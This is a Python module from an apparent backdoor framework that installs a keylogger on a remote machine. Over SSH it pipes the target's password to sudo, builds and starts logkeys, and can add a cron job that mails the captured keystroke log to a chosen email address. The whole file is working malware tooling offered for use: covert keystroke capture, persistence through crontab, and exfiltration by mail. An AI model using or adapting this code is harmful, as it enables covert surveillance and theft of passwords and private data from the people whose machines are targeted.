from backdoors.backdoor import *
import os
import time

class Keylogger(Backdoor):
    prompt = Fore.RED + "(keylogger) " + Fore.BLUE + ">> " + Fore.RESET

    def __init__(self, core):
        cmd.Cmd.__init__(self)
        self.intro = GOOD + "Using keylogger auxiliary module"
        self.core = core
        self.options = {
                "email": Option("email", "False", "set to \"True\" to send reports over email", False),
                "address": Option("address", "example@example.com", "add email address", False),

                }
        self.allow_modules = True
        self.modules = {}
        self.help_text = INFO + "Installs logkeys and starts a listener, and gives the user the option to send the logs back to a specific email address."
        self.target = self.core.curtarget

    def get_command(self):
        self.target.ssh.exec_command("echo " + self.target.pword + " | sudo -S logkeys --start --output ~/log.log")

    def do_exploit(self, args):
        os.system('git clone https://github.com/kernc/logkeys')
        self.target.ssh.exec_command("echo " + self.target.pword + " | sudo -S rm -rf logkeys/")
        self.target.scpFiles(self, 'logkeys', True)
        self.target.ssh.exec_command("./logkeys/configure")
        time.sleep(10)
        print("Configuring...")
        self.target.ssh.exec_command("make logkeys")
        time.sleep(10)
        print("Making...")
        self.target.ssh.exec_command("echo " + self.target.pword + " | sudo -S make install logkeys")
        print("Installing...")
        time.sleep(10)
        self.target.ssh.exec_command("touch log.log")
        time.sleep(1)
        self.target.ssh.exec_command("echo " + self.target.pword + " | sudo -S logkeys --start --output ~/log.log")

        print("Starting...")

        if (self.get_value("email")):
            self.target.ssh.exec_command("echo " + self.target.pword + " | sudo -S apt-get install sendmail")
            self.target.ssh.exec_command("echo " + self.target.pword + " | sudo -S apt-get install mailutils")
            self.target.ssh.exec_command("crontab -l > mycron")
            self.target.ssh.exec_command("echo 'echo report | mail -A ~/log.log " + self.get_value("address") + "' > script.sh")
            self.target.ssh.exec_command("echo \"* * * * 0 echo password | sudo -S bash ~/script.sh\" >> mycron && crontab mycron && rm mycron")
            print("You will recieve an email(probably in spam) with your new keylogger report every hour.")
        for mod in self.modules.keys():
            print(INFO + "Attempting to execute " + mod.name + " module...")
            mod.exploit(self.get_command())

